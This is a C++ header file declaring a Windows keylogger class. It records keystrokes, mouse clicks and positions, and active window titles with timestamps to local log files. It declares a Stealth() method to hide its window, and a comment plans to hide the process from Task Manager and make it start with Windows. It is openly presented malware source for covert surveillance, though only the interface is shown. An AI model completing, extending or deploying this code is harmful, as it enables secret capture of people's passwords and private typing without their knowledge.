#pragma once

#include <iostream>
#include <fstream>
#include <string>
#include <time.h>
#include <algorithm>
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

#define SIZEOF_VK 166
#define INACTIVITY 3
#define TMP_FILE "tmp.txt"
#define LOGS_FILE "logs.txt"

#define MOUSE_CLICK "300"
#define MOUSE_POSITION "310"
#define KEYBOARD "320"
#define PROCESS "330"

class Keylogger {
private:
	// Window object
	HWND				_hwnd;
	HWND				_tHwnd;
	// Time variables
	struct tm			_time;
	__time64_t			_longTime;
	char				_timeBuff[26];
	// Mouse input
	POINT	_p;
	int		_mouseClick, _tMouseClick;
	int		_x, _y, _rX, _rY;
	int		_tX, _tY;
	// Keyboard input
	bool	_capsLock;
	const char*	_vk[SIZEOF_VK];
	// File writting
	std::ofstream		_file;
	// Configuration
	bool	_pause;
	bool	_sendProcess;
	bool	_sendMouse;
	bool	_sendKeyboard;

	// Handle keyboard logs
	void	HandleKeys(const char &c, std::string &sKey, const int &i, std::string &str);
	// Add time to logs strings
	void	TimeLog(std::string &str);
	// Convert mouse inputs to logs
	bool	HandleMouse(std::string &str);
	bool	HandleMouseClick(std::string &str);	
	// To add ? Hide process from task manager, make process starts with windows
public:
	Keylogger(void);
	bool	GetPause(void) {
		return this->_pause;
	}
	void	SetPause(bool pause) {
		this->_pause = pause;
	}
	void	SetSendProcess(bool send) {
		this->_sendProcess = send;
	}
	void	SetSendMouse(bool send) {
		this->_sendMouse = send;
	}
	void	SetSendKeyboard(bool send) {
		this->_sendKeyboard = send;
	}
	// Hide windows from windows
	void	Stealth(void);
	// Get current client windows
	bool	GetWindow(std::string &str);
	// Get keyboard keys inputs
	bool	GetKeys(std::string &str);
	// Get mouse inputs
	bool	GetMouse(std::string &str);
	// Save logs to file
	int		PrintLog(std::string &str, const char* file);
};